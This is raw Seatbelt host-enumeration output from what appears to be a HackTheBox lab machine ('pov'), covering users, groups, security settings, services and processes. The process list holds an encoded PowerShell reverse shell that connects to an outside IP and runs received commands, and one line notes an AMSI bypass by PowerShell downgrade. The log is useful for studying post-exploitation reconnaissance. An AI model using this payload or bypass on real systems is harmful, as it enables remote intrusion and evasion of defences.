CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== CredGuard ======

====== DNSCache ======

  Entry                          : 1.0.0.127.in-addr.arpa
  Name                           : 1.0.0.127.in-addr.arpa.
  Data                           : pov.htb

  Entry                          : pov.htb
  Name                           : 
  Data                           : 

  Entry                          : pov.htb
  Name                           : pov.htb
  Data                           : 127.0.0.1

  Entry                          : dev.pov.htb
  Name                           : dev.pov.htb
  Data                           : pov.htb

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.7.03190

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : False
====== EnvironmentPath ======

  Name                           : C:\Windows\system32
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\Wbem
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\OpenSSH\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Users\alaading\AppData\Local\Microsoft\WindowsApps
  SDDL                           : O:S-1-5-21-2506154456-4081221362-271687478-1001D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2506154456-4081221362-271687478-1001)

====== EnvironmentVariables ======

  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
  <SYSTEM>                           OS                                 Windows_NT
  <SYSTEM>                           Path                               %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\
  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules
  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
  <SYSTEM>                           USERNAME                           SYSTEM
  <SYSTEM>                           windir                             %SystemRoot%
  <SYSTEM>                           NUMBER_OF_PROCESSORS               2
  <SYSTEM>                           PROCESSOR_LEVEL                    6
  <SYSTEM>                           PROCESSOR_IDENTIFIER               Intel64 Family 6 Model 85 Stepping 7, GenuineIntel
  <SYSTEM>                           PROCESSOR_REVISION                 5507
  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
  POV\alaading                       Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  POV\alaading                       TEMP                               %USERPROFILE%\AppData\Local\Temp
  POV\alaading                       TMP                                %USERPROFILE%\AppData\Local\Temp
====== Hotfixes ======

Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.

====== InterestingProcesses ======

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 4820
    Owner        : 
    CommandLine  : "C:\Windows\System32\cmd.exe" /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 3628
    Owner        : 
    CommandLine  : powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 2964
    Owner        : POV\alaading
    CommandLine  : C:\Windows\system32\cmd.exe

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 4084
    Owner        : POV\alaading
    CommandLine  : powershell.exe

====== InternetSettings ======

General Settings
  Hive                               Key : Value

  HKCU          DisableCachingOfSSLPages : 1
  HKCU                IE5_UA_Backup_Flag : 5.0
  HKCU                   PrivacyAdvanced : 1
  HKCU                   SecureProtocols : 2048
  HKCU                        User Agent : Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU             CertificateRevocation : 1
  HKCU              ZonesSecurityUpgrade : System.Byte[]
  HKCU                WarnonZoneCrossing : 1
  HKCU                   EnableNegotiate : 1
  HKCU                      MigrateProxy : 1
  HKCU                       ProxyEnable : 0
  HKCU                      ActiveXCache : C:\Windows\Downloaded Program Files
  HKCU                CodeBaseSearchPath : CODEBASE
  HKCU                    EnablePunycode : 1
  HKCU                      MinorVersion : 0
  HKCU                    WarnOnIntranet : 1

URLs by Zone
  No URLs configured

Zone Auth Settings
====== LAPS ======

  LAPS Enabled                          : False
  LAPS Admin Account Name               : 
  LAPS Password Complexity              : 
  LAPS Password Length                  : 
  LAPS Expiration Protection Enabled    : 
====== LastShutdown ======

  LastShutdown                   : 1/23/2024 2:49:31 AM

====== LocalGPOs ======

====== LocalGroups ======

Non-empty Local Groups (and memberships)


  ** POV\Administrators ** (Administrators have complete and unrestricted access to the computer/domain)

  User            POV\Administrator                        S-1-5-21-2506154456-4081221362-271687478-500

  ** POV\Guests ** (Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted)

  User            POV\Guest                                S-1-5-21-2506154456-4081221362-271687478-501

  ** POV\Remote Management Users ** (Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.)

  User            POV\alaading                             S-1-5-21-2506154456-4081221362-271687478-1001

  ** POV\System Managed Accounts Group ** (Members of this group are managed by the system.)

  User            POV\DefaultAccount                       S-1-5-21-2506154456-4081221362-271687478-503

  ** POV\Users ** (Users are prevented from making accidental or intentional system-wide changes and can run most applications)

  WellKnownGroup  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  WellKnownGroup  NT AUTHORITY\Authenticated Users         S-1-5-11
  User            POV\sfitz                                S-1-5-21-2506154456-4081221362-271687478-1000
  User            POV\alaading                             S-1-5-21-2506154456-4081221362-271687478-1001

====== LocalUsers ======

  ComputerName                   : localhost
  UserName                       : Administrator
  Enabled                        : True
  Rid                            : 500
  UserType                       : Administrator
  Comment                        : Built-in account for administering the computer/domain
  PwdLastSet                     : 11/6/2023 9:57:53 AM
  LastLogon                      : 1/27/2024 11:02:50 AM
  NumLogins                      : 62

  ComputerName                   : localhost
  UserName                       : alaading
  Enabled                        : True
  Rid                            : 1001
  UserType                       : User
  Comment                        : 
  PwdLastSet                     : 11/6/2023 9:59:23 AM
  LastLogon                      : 1/27/2024 12:01:31 PM
  NumLogins                      : 582

  ComputerName                   : localhost
  UserName                       : DefaultAccount
  Enabled                        : False
  Rid                            : 503
  UserType                       : Guest
  Comment                        : A user account managed by the system.
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : Guest
  Enabled                        : False
  Rid                            : 501
  UserType                       : Guest
  Comment                        : Built-in account for guest access to the computer/domain
  PwdLastSet                     : 1/1/1970 12:00:00 AM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

  ComputerName                   : localhost
  UserName                       : sfitz
  Enabled                        : True
  Rid                            : 1000
  UserType                       : User
  Comment                        : 
  PwdLastSet                     : 11/6/2023 9:57:24 AM
  LastLogon                      : 1/27/2024 11:06:04 AM
  NumLogins                      : 25

  ComputerName                   : localhost
  UserName                       : WDAGUtilityAccount
  Enabled                        : False
  Rid                            : 504
  UserType                       : Guest
  Comment                        : A user account managed and used by the system for Windows Defender Application Guard scenarios.
  PwdLastSet                     : 10/26/2023 1:26:33 PM
  LastLogon                      : 1/1/1970 12:00:00 AM
  NumLogins                      : 0

====== LogonSessions ======

Logon Sessions (via WMI)


  UserName              : alaading
  Domain                : POV
  LogonId               : 3947809
  LogonType             : Interactive
  AuthenticationPackage : NTLM
  StartTime             : 1/27/2024 12:01:31 PM
  UserPrincipalName     : 
====== LSASettings ======

  auditbasedirectories           : 0
  auditbaseobjects               : 0
  Bounds                         : 00-30-00-00-00-20-00-00
  crashonauditfail               : 0
  fullprivilegeauditing          : 00
  LimitBlankPasswordUse          : 1
  NoLmHash                       : 1
  Security Packages              : ""
  Notification Packages          : rassfm,scecli
  Authentication Packages        : msv1_0
  LsaPid                         : 624
  LsaCfgFlagsDefault             : 0
  SecureBoot                     : 1
  ProductType                    : 7
  disabledomaincreds             : 0
  everyoneincludesanonymous      : 0
  forceguest                     : 0
  restrictanonymous              : 0
  restrictanonymoussam           : 1
====== McAfeeConfigs ======

====== NamedPipes ======

1376,svchost,atsvc
864,svchost,epmapper
932,svchost,eventlog
    SDDL         : O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
488,wininit,InitShutdown
624,lsass,lsass
916,svchost,LSM_API_service
616,services,ntsvcs
0,Unk,PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
0,Unk,PSHost.133508588041711810.3628.DefaultAppDomain.powershell
4084,powershell,PSHost.133508596337683443.4084.DefaultAppDomain.powershell
3144,svchost,ROUTER
    SDDL         : O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
616,services,scerpc
2196,svchost,srvsvc
2176,svchost,tapsrv
2268,svchost,trkwks
2280,VGAuthService,vgauth-service
    SDDL         : O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
2628,svchost,W32TIME_ALT
0,Unk,Winsock2\CatalogChangeListener-1e8-0
0,Unk,Winsock2\CatalogChangeListener-268-0
0,Unk,Winsock2\CatalogChangeListener-270-0
0,Unk,Winsock2\CatalogChangeListener-360-0
0,Unk,Winsock2\CatalogChangeListener-3a4-0
0,Unk,Winsock2\CatalogChangeListener-560-0
1948,svchost,wkssvc
====== NetworkProfiles ======

ERROR: Unable to collect. Must be an administrator.
====== NetworkShares ======

  Name                           : ADMIN$
  Path                           : C:\Windows
  Description                    : Remote Admin
  Type                           : Disk Drive Admin

  Name                           : C$
  Path                           : C:\
  Description                    : Default share
  Type                           : Disk Drive Admin

  Name                           : IPC$
  Path                           : 
  Description                    : Remote IPC
  Type                           : IPC Admin

====== NTLMSettings ======

  LanmanCompatibilityLevel    : (Send NTLMv2 response only - Win7+ default)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
      NTLMMinServerSec        : 536870912 (Require128BitKey)


  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      : 
====== OptionalFeatures ======

State    Name                                               Caption
ERROR:   [!] Terminating exception running command 'OptionalFeatures': System.Runtime.InteropServices.COMException (0x80070422)
   at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)
   at System.Management.ManagementObjectCollection.ManagementObjectEnumerator.MoveNext()
   at Seatbelt.Commands.Windows.OptionalFeaturesCommand.<Execute>d__10.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== OSInfo ======

  Hostname                      :  pov
  Domain Name                   :  
  Username                      :  POV\alaading
  ProductName                   :  Windows Server 2019 Standard
  EditionID                     :  ServerStandard
  ReleaseId                     :  1809
  Build                         :  17763.5329
  BuildBranch                   :  rs5_release
  CurrentMajorVersionNumber     :  10
  CurrentVersion                :  6.3
  Architecture                  :  AMD64
  ProcessorCount                :  2
  IsVirtualMachine              :  True
  BootTimeUtc (approx)          :  1/27/2024 7:01:54 PM (Total uptime: 00:01:16:24)
  HighIntegrity                 :  False
  IsLocalAdmin                  :  False
  CurrentTimeUtc                :  1/27/2024 8:18:18 PM (Local time: 1/27/2024 12:18:18 PM)
  TimeZone                      :  Pacific Standard Time
  TimeZoneOffset                :  -08:00:00
  InputLanguage                 :  US
  InstalledInputLanguages       :  
  MachineGuid                   :  04c4db02-d65a-48fe-8d1f-f6ba6c321c6a
====== PoweredOnEvents ======

Collecting kernel boot (EID 12) and shutdown (EID 13) events from the last 7 days

Powered On Events (Time is local time)

  1/27/2024 11:01:54 AM   :  startup

  1/23/2024 2:49:31 AM    :  shutdown
  1/23/2024 2:28:32 AM    :  startup
====== PowerShell ======


  Installed CLR Versions
      4.0.30319

  Installed PowerShell Versions
      2.0
        [!] Version 2.0.50727 of the CLR is not installed - PowerShell v2.0 won't be able to run.
      5.1.17763.1

  Transcription Logging Settings
      Enabled            : False
      Invocation Logging : False
      Log Directory      : 

  Module Logging Settings
      Enabled             : False
      Logged Module Names :

  Script Block Logging Settings
      Enabled            : False
      Invocation Logging : False

  Anti-Malware Scan Interface (AMSI)
      OS Supports AMSI: True
        [!] You can do a PowerShell version downgrade to bypass AMSI.
====== Processes ======

Collecting Non Microsoft Processes (via WMI)

 ProcessName                              : vm3dservice
 ProcessId                                : 2328
 ParentProcessId                          : 616
 CompanyName                              : VMware, Inc.
 Description                              : VMware SVGA Helper Service
 Version                                  : 9.17.06.0003
 Path                                     : C:\Windows\system32\vm3dservice.exe
 CommandLine                              : C:\Windows\system32\vm3dservice.exe
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

 ProcessName                              : vmtoolsd
 ProcessId                                : 2320
 ParentProcessId                          : 616
 CompanyName                              : VMware, Inc.
 Description                              : VMware Tools Core Service
 Version                                  : 12.3.0.44994
 Path                                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 CommandLine                              : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

 ProcessName                              : VGAuthService
 ProcessId                                : 2280
 ParentProcessId                          : 616
 CompanyName                              : VMware, Inc.
 Description                              : VMware Guest Authentication Service
 Version                                  : 12.3.0.1838
 Path                                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 CommandLine                              : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

 ProcessName                              : vm3dservice
 ProcessId                                : 2912
 ParentProcessId                          : 2328
 CompanyName                              : VMware, Inc.
 Description                              : VMware SVGA Helper Service
 Version                                  : 9.17.06.0003
 Path                                     : C:\Windows\system32\vm3dservice.exe
 CommandLine                              : vm3dservice.exe -n
 IsDotNet                                 : False
 ProcessProtectionInformation             : 

====== PSSessionSettings ======

ERROR: Unable to collect. Must be an administrator.
====== RDPSessions ======

  SessionID                     :  0
  SessionName                   :  Services
  UserName                      :  \
  State                         :  Disconnected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  20h:18m:18s:861ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

  SessionID                     :  1
  SessionName                   :  Console
  UserName                      :  \
  State                         :  Connected
  HostName                      :  
  FarmName                      :  
  LastInput                     :  20h:18m:18s:875ms
  ClientIP                      :  
  ClientHostname                :  
  ClientResolution              :  
  ClientBuild                   :  0
  ClientHardwareId              :  0,0,0,0
  ClientDirectory               :  

====== RDPsettings ======

RDP Server Settings:
  NetworkLevelAuthentication: 
  BlockClipboardRedirection:  
  BlockComPortRedirection:    
  BlockDriveRedirection:      
  BlockLptPortRedirection:    
  BlockPnPDeviceRedirection:  
  BlockPrinterRedirection:    
  AllowSmartCardRedirection:  

RDP Client Settings:
  DisablePasswordSaving: True
  RestrictedRemoteAdministration: False
====== SCCM ======

  Server                         : 
  SiteCode                       : 
  ProductVersion                 : 
  LastSuccessfulInstallParams    : 

====== Services ======

Non Microsoft Services (via WMI)

  Name                           : ssh-agent
  DisplayName                    : OpenSSH Authentication Agent
  Description                    : Agent to hold private keys used for public key authentication.
  User                           : LocalSystem
  State                          : Stopped
  StartMode                      : Disabled
  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 7.7.2.1
  IsDotNet                       : False

  Name                           : VGAuthService
  DisplayName                    : VMware Alias Manager and Ticket Service
  Description                    : Alias Manager and Ticket Service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
